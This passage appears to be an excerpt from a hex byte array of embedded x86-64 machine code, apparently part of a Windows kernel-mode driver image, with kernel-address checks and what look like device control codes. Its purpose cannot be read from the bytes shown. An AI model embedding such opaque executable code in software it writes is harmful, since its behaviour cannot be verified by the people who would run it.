    0xEC, 0x74, 0x71, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x8D, 0x5D, 0x08, 0xBF, 0x40, 0x00, 0x00, 0x00, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x4C, 0x39, 0x33, 0x74, 0x25, 0x48, 0x8B, 0x4B, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x0B, 0x33, 0xD2,
    0xE8, 0x6B, 0x3B, 0x00, 0x00, 0x4C, 0x89, 0x73, 0x08, 0x48, 0x8B, 0x0B, 0x33, 0xD2, 0xE8, 0x5D,
    0x3B, 0x00, 0x00, 0x4C, 0x89, 0x33, 0x44, 0x89, 0x73, 0x10, 0x48, 0x83, 0xC3, 0x18, 0x48, 0x83,
    0xEF, 0x01, 0x75, 0xCC, 0x48, 0x8B, 0xCD, 0x48, 0x8B, 0x6D, 0x00, 0x49, 0x3B, 0xCC, 0x4C, 0x89,
    0x31, 0x44, 0x89, 0xB1, 0x08, 0x06, 0x00, 0x00, 0x74, 0x05, 0xE8, 0x41, 0x47, 0x00, 0x00, 0x48,
    0x85, 0xED, 0x75, 0x9C, 0x48, 0x8B, 0x4E, 0x20, 0xE8, 0xC3, 0x37, 0x00, 0x00, 0x49, 0x8B, 0x45,
    0x10, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x3D, 0x01, 0x00, 0x00, 0x49, 0x8B, 0x6D, 0x10, 0x4D, 0x89,
    0x75, 0x10, 0x48, 0x85, 0xED, 0x0F, 0x84, 0x2C, 0x01, 0x00, 0x00, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x8B, 0x4D, 0x10, 0x48, 0x8B, 0x5D, 0x08, 0x4C, 0x8B, 0xE5, 0x8B, 0x43, 0x38, 0x3B, 0xC1, 0x76,
    0x0B, 0x8B, 0x45, 0x10, 0x29, 0x43, 0x38, 0xE9, 0xF2, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x46, 0x48,
    0x48, 0x3B, 0xC3, 0x74, 0x1F, 0x48, 0x8B, 0x4E, 0x48, 0x48, 0x8B, 0x01, 0x48, 0x3B, 0xC3, 0x74,
    0x0B, 0x48, 0x8B, 0x09, 0x48, 0x8B, 0x01, 0x48, 0x3B, 0xC3, 0x75, 0xF5, 0x48, 0x8B, 0x03, 0x48,
    0x89, 0x01, 0xEB, 0x07, 0x48, 0x8B, 0x03, 0x48, 0x89, 0x46, 0x48, 0x48, 0x8B, 0x46, 0x28, 0x48,
    0x3B, 0x43, 0x08, 0x75, 0x10, 0x4C, 0x89, 0x76, 0x28, 0x4C, 0x89, 0x76, 0x30, 0x4C, 0x89, 0x76,
    0x38, 0x4C, 0x89, 0x76, 0x40, 0x48, 0x8B, 0x46, 0x08, 0x48, 0x85, 0xC0, 0x74, 0x76, 0x48, 0x8B,
    0x0E, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x41, 0x8B, 0xFE, 0x4C, 0x89, 0x74, 0x24, 0x30, 0x40, 0x88,
    0x7C, 0x24, 0x38, 0xE8, 0xE8, 0x2F, 0x00, 0x00, 0x4C, 0x8B, 0x5E, 0x08, 0x4D, 0x85, 0xDB, 0x74,
    0x2F, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x49, 0x8B, 0x4B, 0x10, 0x8B, 0x43, 0x20, 0x48, 0x2B, 0x4B, 0x08, 0x48, 0x3B, 0xC8, 0x73, 0x07,
    0x4D, 0x89, 0x73, 0x10, 0x83, 0xC7, 0x01, 0x4D, 0x8B, 0x5B, 0x08, 0x4D, 0x85, 0xDB, 0x75, 0xE0,
    0x48, 0x8B, 0x0E, 0x48, 0x8D, 0x54, 0x24, 0x30, 0xE8, 0xC3, 0x2F, 0x00, 0x00, 0x85, 0xFF, 0x74,
    0x13, 0x48, 0x8D, 0x53, 0x3C, 0x48, 0x8D, 0x0D, 0x54, 0x5C, 0x00, 0x00, 0x44, 0x8B, 0xC7, 0xE8,
    0xF4, 0x20, 0x00, 0x00, 0x48, 0x8B, 0x43, 0x18, 0x48, 0x85, 0xC0, 0x74, 0x0B, 0x81, 0x7B, 0x34,
    0x18, 0x82, 0x22, 0x00, 0x75, 0x02, 0xFF, 0xD0, 0x44, 0x89, 0x73, 0x38, 0x48, 0x8B, 0xCB, 0xC7,
    0x43, 0x34, 0x1C, 0x82, 0x22, 0x00, 0x4C, 0x89, 0x33, 0xE8, 0x52, 0x46, 0x00, 0x00, 0x4C, 0x89,
    0x75, 0x08, 0x48, 0x8B, 0x6D, 0x00, 0x49, 0x8B, 0xCC, 0xE8, 0xF2, 0x45, 0x00, 0x00, 0x48, 0x85,
    0xED, 0x0F, 0x85, 0xD9, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x4E, 0x20, 0xE8, 0xA0, 0x36, 0x00, 0x00,
    0x4D, 0x39, 0x75, 0x30, 0x4C, 0x8B, 0x64, 0x24, 0x70, 0x48, 0x8B, 0x74, 0x24, 0x68, 0x48, 0x8B,
    0x6C, 0x24, 0x60, 0x0F, 0x84, 0x92, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x5D, 0x00, 0x49, 0x8D, 0x85,
    0x00, 0x10, 0x00, 0x00, 0x41, 0x8B, 0xFE, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x74, 0x48,
    0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x49, 0x8B, 0xC5, 0x48, 0x23, 0xC1, 0x48,
    0x3B, 0xC1, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x5A, 0x41, 0x81, 0x7D, 0x08, 0x64, 0x72, 0x69,
    0x62, 0x75, 0x50, 0x48, 0x8B, 0x4B, 0x50, 0xE8, 0x14, 0x36, 0x00, 0x00, 0x49, 0x8B, 0x55, 0x30,
    0x48, 0x85, 0xD2, 0x74, 0x12, 0x48, 0x8B, 0xCB, 0xE8, 0x53, 0xD7, 0xFF, 0xFF, 0x85, 0xC0, 0x8B,
    0xF8, 0x75, 0x04, 0x4D, 0x89, 0x75, 0x30, 0x45, 0x39, 0x75, 0x38, 0x74, 0x1D, 0x85, 0xFF, 0x75,
    0x19, 0x45, 0x89, 0x75, 0x38, 0x8B, 0x43, 0x68, 0x85, 0xC0, 0x74, 0x0E, 0x83, 0x43, 0x68, 0xFF,
    0x75, 0x08, 0x48, 0x8B, 0xCB, 0xE8, 0x76, 0xD7, 0xFF, 0xFF, 0x48, 0x8B, 0x4B, 0x50, 0xE8, 0xFD,
    0x35, 0x00, 0x00, 0x4D, 0x89, 0x75, 0x30, 0x45, 0x89, 0x75, 0x38, 0x48, 0x8B, 0x5C, 0x24, 0x78,
    0x48, 0x83, 0xC4, 0x40, 0x41, 0x5E, 0x41, 0x5D, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89, 0x6B, 0x10, 0x49, 0x89, 0x73, 0x18, 0x49,
    0x89, 0x7B, 0x20, 0x41, 0x54, 0x48, 0x83, 0xEC, 0x40, 0x33, 0xC0, 0x49, 0x63, 0xD8, 0x49, 0x8B,
    0xF1, 0x49, 0x89, 0x43, 0xE0, 0x49, 0x89, 0x43, 0xE8, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00,
    0x44, 0x8B, 0xE3, 0x48, 0x8B, 0xFA, 0x48, 0x8B, 0xE9, 0x49, 0xC1, 0xE4, 0x0C, 0x48, 0x3D, 0x00,
    0x20, 0x00, 0x00, 0x49, 0xC7, 0x43, 0xD8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x82, 0x15, 0x01, 0x00,
    0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC5, 0x48, 0x23,
    0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0xF7, 0x00, 0x00, 0x00, 0x81,
    0x7D, 0x08, 0x64, 0x72, 0x69, 0x62, 0x0F, 0x85, 0xEA, 0x00, 0x00, 0x00, 0x49, 0x8D, 0x81, 0x00,
    0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x0F, 0x82, 0xD7, 0x00, 0x00, 0x00, 0x49,
    0x8B, 0xC1, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0xC3,
    0x00, 0x00, 0x00, 0x48, 0x8D, 0x82, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x25, 0x00, 0xF0, 0xFF, 0xFF,
    0x48, 0x3B, 0xC2, 0x0F, 0x85, 0xAD, 0x00, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x0F, 0x84, 0xA4, 0x00,
    0x00, 0x00, 0x44, 0x8B, 0xC3, 0x48, 0x8B, 0xCD, 0xE8, 0x13, 0xEA, 0xFF, 0xFF, 0x85, 0xC0, 0x0F,
    0x89, 0x96, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x30, 0x01, 0x00, 0x00, 0x00, 0xE8, 0x0E, 0x24,
    0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x4D, 0x8B, 0xC4, 0x48, 0x8B, 0xD7, 0x4C, 0x8B, 0xC8,
    0xE8, 0x1B, 0x3C, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xF8, 0x78, 0x52, 0x85, 0xDB, 0x74, 0x2F, 0x48,
    0x8D, 0x3C, 0xDE, 0xBE, 0xFF, 0xFF, 0xFF, 0xFF, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x4C, 0x24, 0x20, 0x03, 0xDE, 0x48, 0x83, 0xEF, 0x08, 0x8B, 0xD3, 0xE8, 0x6E, 0x37,
    0x00, 0x00, 0x48, 0x3B, 0xC6, 0x48, 0x89, 0x07, 0x74, 0x27, 0x85, 0xDB, 0x75, 0xE2, 0x48, 0x8D,
    0x4C, 0x24, 0x20, 0x48, 0x8B, 0xD5, 0xE8, 0x55, 0xED, 0xFF, 0xFF, 0x85, 0xC0, 0x8B, 0xF8, 0x79,
    0x0C, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0x33, 0xD2, 0xE8, 0xC3, 0x37, 0x00, 0x00, 0x8B, 0xC7, 0xEB,
    0x1A, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0x33, 0xD2, 0xBF, 0xE0, 0xFF, 0xFF, 0xFF, 0xE8, 0xAE, 0x37,
    0x00, 0x00, 0x8B, 0xC7, 0xEB, 0x05, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x50,
    0x48, 0x8B, 0x6C, 0x24, 0x58, 0x48, 0x8B, 0x74, 0x24, 0x60, 0x48, 0x8B, 0x7C, 0x24, 0x68, 0x48,
    0x83, 0xC4, 0x40, 0x41, 0x5C, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00,
    0x00, 0x48, 0x8B, 0xFA, 0x48, 0x8B, 0xD9, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x57, 0x48,
    0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC3, 0x48, 0x23, 0xC1, 0x48,
    0x3B, 0xC1, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x3D, 0x81, 0x7B, 0x08, 0x64, 0x72, 0x69, 0x62,
    0x75, 0x34, 0x48, 0x8B, 0xCB, 0xE8, 0x36, 0xE8, 0xFF, 0xFF, 0x84, 0xC0, 0x74, 0x0D, 0x33, 0xC0,
    0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x41, 0xB8, 0x01, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xCB, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20,
    0x5F, 0xE9, 0xDA, 0xED, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x30,
    0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x6C, 0x24, 0x18, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x41, 0x54, 0x48, 0x83, 0xEC, 0x50,
    0x33, 0xC0, 0x49, 0x8B, 0xE9, 0x4D, 0x8B, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44,
    0x24, 0x40, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x48,
    0x8B, 0xF9, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x82, 0x34, 0x01, 0x00,
    0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC7, 0x48, 0x23,
    0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x16, 0x01, 0x00, 0x00, 0x81,
    0x7F, 0x08, 0x64, 0x72, 0x69, 0x62, 0x0F, 0x85, 0x09, 0x01, 0x00, 0x00, 0x4D, 0x85, 0xC9, 0x48,
    0x89, 0x74, 0x24, 0x68, 0x0F, 0x84, 0xF4, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xEB,
    0x00, 0x00, 0x00, 0x48, 0x8B, 0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x85, 0xF6, 0x0F, 0x84,
    0xDA, 0x00, 0x00, 0x00, 0x8D, 0x42, 0xFF, 0x3D, 0xFE, 0x00, 0x00, 0x00, 0x0F, 0x87, 0xCC, 0x00,
    0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x30, 0xC1, 0xE2, 0x0C, 0x41, 0xB0, 0x01, 0x48, 0x89, 0x5C,
    0x24, 0x60, 0xE8, 0xD9, 0x39, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xD8, 0x0F, 0x88, 0xA9, 0x00, 0x00,
    0x00, 0xE8, 0x0A, 0x22, 0x00, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x30, 0x48, 0x8D, 0x4C, 0x24, 0x38,
    0x48, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC9, 0x49, 0x83, 0xC8, 0xFF, 0xC7, 0x44, 0x24, 0x20,
    0x07, 0x00, 0x00, 0x00, 0xE8, 0xE7, 0x3F, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xD8, 0x78, 0x6F, 0x48,
    0x8D, 0x4C, 0x24, 0x30, 0x48, 0x8B, 0xD7, 0xC7, 0x44, 0x24, 0x40, 0x02, 0x00, 0x00, 0x00, 0xE8,
    0x6C, 0xEB, 0xFF, 0xFF, 0x85, 0xC0, 0x8B, 0xD8, 0x75, 0x48, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8,
    0x3C, 0x34, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x49, 0x89, 0x04, 0x24, 0xE8, 0x7E, 0x34,
    0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x33, 0xD2, 0x48, 0x89, 0x45, 0x00, 0xE8, 0x3E, 0x35,
    0x00, 0x00, 0x48, 0x89, 0x06, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x8B, 0x74, 0x24,
    0x68, 0x48, 0x8B, 0x6C, 0x24, 0x70, 0x48, 0x8B, 0x7C, 0x24, 0x78, 0x48, 0x83, 0xC4, 0x50, 0x41,
    0x5C, 0xC3, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x33, 0xD2, 0xE8, 0x92, 0x35, 0x00, 0x00, 0x48, 0x8B,
    0x4C, 0x24, 0x30, 0x33, 0xD2, 0xE8, 0x86, 0x35, 0x00, 0x00, 0x8B, 0xC3, 0xEB, 0xC9, 0xB8, 0xFE,
    0xFF, 0xFF, 0xFF, 0xEB, 0xC7, 0x48, 0x8B, 0x6C, 0x24, 0x70, 0x48, 0x8B, 0x7C, 0x24, 0x78, 0xB8,
    0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x50, 0x41, 0x5C, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x2E, 0x49,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC0, 0x49,
    0x3B, 0xC0, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x14, 0x81, 0x79, 0x08, 0x64, 0x72, 0x69, 0x62,
    0x75, 0x0B, 0x41, 0xB8, 0x02, 0x00, 0x00, 0x00, 0xE9, 0xF3, 0xEB, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF,
    0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x6C, 0x24, 0x18, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56,
    0x48, 0x83, 0xEC, 0x50, 0x33, 0xC0, 0x33, 0xFF, 0x4D, 0x8B, 0xE9, 0x48, 0x89, 0x44, 0x24, 0x38,
    0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20,
    0x00, 0x00, 0x4D, 0x8B, 0xF0, 0x8B, 0xEA, 0x4C, 0x8B, 0xE1, 0x48, 0x89, 0x7C, 0x24, 0x30, 0x0F,
    0x82, 0x5B, 0x01, 0x00, 0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x49,
    0x8B, 0xC4, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x3D,
    0x01, 0x00, 0x00, 0x41, 0x81, 0x7C, 0x24, 0x08, 0x64, 0x72, 0x69, 0x62, 0x0F, 0x85, 0x2E, 0x01,
    0x00, 0x00, 0x4D, 0x85, 0xC9, 0x48, 0x89, 0x5C, 0x24, 0x70, 0x0F, 0x84, 0x19, 0x01, 0x00, 0x00,
    0x4D, 0x85, 0xC0, 0x0F, 0x84, 0x10, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0x90, 0x00, 0x00,
    0x00, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0xFF, 0x00, 0x00, 0x00, 0x8D, 0x45, 0xFF, 0x3D, 0xFF, 0x00,
    0x00, 0x00, 0x0F, 0x87, 0xF1, 0x00, 0x00, 0x00, 0x8B, 0xD5, 0x48, 0x8D, 0x4C, 0x24, 0x30, 0x41,
    0xB0, 0x01, 0xC1, 0xE2, 0x0C, 0x48, 0x89, 0x74, 0x24, 0x78, 0xE8, 0x91, 0x37, 0x00, 0x00, 0x85,
    0xC0, 0x8B, 0xF0, 0x0F, 0x88, 0xCC, 0x00, 0x00, 0x00, 0xE8, 0x22, 0x20, 0x00, 0x00, 0x48, 0x8B,
    0x54, 0x24, 0x30, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC9,
    0x49, 0x83, 0xC8, 0xFF, 0xC7, 0x44, 0x24, 0x20, 0x07, 0x00, 0x00, 0x00, 0xE8, 0xFF, 0x3D, 0x00,
    0x00, 0x85, 0xC0, 0x8B, 0xF0, 0x0F, 0x88, 0x8E, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x30,
    0x49, 0x8B, 0xD4, 0xC7, 0x44, 0x24, 0x40, 0x03, 0x00, 0x00, 0x00, 0xE8, 0x80, 0xE9, 0xFF, 0xFF,
    0x85, 0xC0, 0x8B, 0xF0, 0x75, 0x67, 0x85, 0xED, 0x74, 0x25, 0x48, 0x8B, 0xF5, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x8B, 0xD7, 0xE8, 0x63, 0x33, 0x00, 0x00, 0x48, 0x83, 0xC3,
    0x08, 0x48, 0x83, 0xC7, 0x01, 0x48, 0x83, 0xEE, 0x01, 0x48, 0x89, 0x43, 0xF8, 0x75, 0xE1, 0x48,
    0x8B, 0x4C, 0x24, 0x30, 0xE8, 0x27, 0x32, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x49, 0x89,
    0x06, 0xE8, 0x6A, 0x32, 0x00, 0x00, 0x49, 0x89, 0x45, 0x00, 0x33, 0xC0, 0x48, 0x8B, 0x74, 0x24,
    0x78, 0x48, 0x8B, 0x5C, 0x24, 0x70, 0x4C, 0x8D, 0x5C, 0x24, 0x50, 0x49, 0x8B, 0x6B, 0x30, 0x49,
    0x8B, 0x7B, 0x38, 0x49, 0x8B, 0xE3, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0xC3, 0x48, 0x8B, 0x4C,
    0x24, 0x38, 0x33, 0xD2, 0xE8, 0x87, 0x33, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x33, 0xD2,
    0xE8, 0x7B, 0x33, 0x00, 0x00, 0x8B, 0xC6, 0xEB, 0xC3, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xEB, 0xC1,
    0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xEB, 0xBF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x2E, 0x49,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC0, 0x49,
    0x3B, 0xC0, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x14, 0x81, 0x79, 0x08, 0x64, 0x72, 0x69, 0x62,
    0x75, 0x0B, 0x41, 0xB8, 0x03, 0x00, 0x00, 0x00, 0xE9, 0xF3, 0xE9, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF,
    0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x50, 0x33,
    0xC0, 0x49, 0x8B, 0xF1, 0x49, 0x8B, 0xE8, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24,
    0x40, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x48, 0x8B,
    0xF9, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x82, 0x3C, 0x01, 0x00, 0x00,
    0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC7, 0x48, 0x23, 0xC1,
    0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x1E, 0x01, 0x00, 0x00, 0x81, 0x7F,
    0x08, 0x64, 0x72, 0x69, 0x62, 0x0F, 0x85, 0x11, 0x01, 0x00, 0x00, 0x49, 0x8D, 0x80, 0x00, 0x10,
    0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x0F, 0x82, 0x13, 0x01, 0x00, 0x00, 0x49, 0x8B,
    0xC0, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0xFF, 0x00,
    0x00, 0x00, 0x49, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x0F,
    0x82, 0xEC, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xC1, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09,
    0x48, 0x85, 0xC0, 0x0F, 0x85, 0xD8, 0x00, 0x00, 0x00, 0x8D, 0x42, 0xFF, 0x3D, 0xFE, 0xFF, 0x3F,
    0x00, 0x0F, 0x87, 0xB5, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x30, 0x8B, 0xD2, 0x41, 0xB0,
    0x01, 0x48, 0x89, 0x5C, 0x24, 0x60, 0xE8, 0x15, 0x35, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xD8, 0x0F,
    0x88, 0x93, 0x00, 0x00, 0x00, 0xE8, 0x06, 0x1E, 0x00, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x30, 0x48,
    0x8D, 0x4C, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC9, 0x49, 0x83, 0xC8, 0xFF,
    0xC7, 0x44, 0x24, 0x20, 0x07, 0x00, 0x00, 0x00, 0xE8, 0xE3, 0x3B, 0x00, 0x00, 0x85, 0xC0, 0x8B,
    0xD8, 0x78, 0x59, 0x48, 0x8D, 0x4C, 0x24, 0x30, 0x48, 0x8B, 0xD7, 0xC7, 0x44, 0x24, 0x40, 0x04,
    0x00, 0x00, 0x00, 0xE8, 0x68, 0xE7, 0xFF, 0xFF, 0x85, 0xC0, 0x8B, 0xD8, 0x75, 0x32, 0x48, 0x8B,
    0x4C, 0x24, 0x30, 0xE8, 0x38, 0x30, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x89, 0x45,
    0x00, 0xE8, 0x7A, 0x30, 0x00, 0x00, 0x48, 0x89, 0x06, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x60,
    0x48, 0x8B, 0x6C, 0x24, 0x68, 0x48, 0x8B, 0x74, 0x24, 0x70, 0x48, 0x83, 0xC4, 0x50, 0x5F, 0xC3,
    0x48, 0x8B, 0x4C, 0x24, 0x38, 0x33, 0xD2, 0xE8, 0xA4, 0x31, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24,
    0x30, 0x33, 0xD2, 0xE8, 0x98, 0x31, 0x00, 0x00, 0x8B, 0xC3, 0xEB, 0xCF, 0xB8, 0xFE, 0xFF, 0xFF,
    0xFF, 0x48, 0x8B, 0x6C, 0x24, 0x68, 0x48, 0x8B, 0x74, 0x24, 0x70, 0x48, 0x83, 0xC4, 0x50, 0x5F,
    0xC3, 0x48, 0x8B, 0x6C, 0x24, 0x68, 0x48, 0x8B, 0x74, 0x24, 0x70, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF,
    0x48, 0x83, 0xC4, 0x50, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x2E, 0x49,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC0, 0x49,
    0x3B, 0xC0, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x14, 0x81, 0x79, 0x08, 0x64, 0x72, 0x69, 0x62,
    0x75, 0x0B, 0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, 0xE9, 0xF3, 0xE7, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF,
    0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x20, 0x55, 0x41, 0x54, 0x41, 0x55, 0x48, 0x83, 0xEC, 0x50, 0x33, 0xC0,
    0x4D, 0x8B, 0xE9, 0x4D, 0x8B, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x40,
